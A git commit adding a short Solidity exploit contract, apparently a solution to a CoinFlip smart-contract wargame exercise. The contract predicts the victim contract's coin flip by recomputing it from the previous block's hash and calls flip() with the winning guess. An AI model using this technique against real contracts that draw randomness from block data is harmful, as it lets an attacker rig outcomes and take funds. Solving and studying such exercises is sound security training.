b9ccd5ba3200caf023e7f8b40c57cd70bb60e756
dimalavrenuk <105659427+dimalavrenuk@users.noreply.github.com>
2026-01-12 18:56:47 +0200

    Update attackCoinFlip.sol

--- attackCoinFlip.sol
+++ attackCoinFlip.sol
@@ -1,1 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+interface CoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract CoinFlipAttack {
+    CoinFlip public victimContract;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+    constructor(address _victimAddress) {
+            victimContract = CoinFlip(_victimAddress);
+    }
+
+    function attack() public payable {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        victimContract.flip(side);
+    }
+}
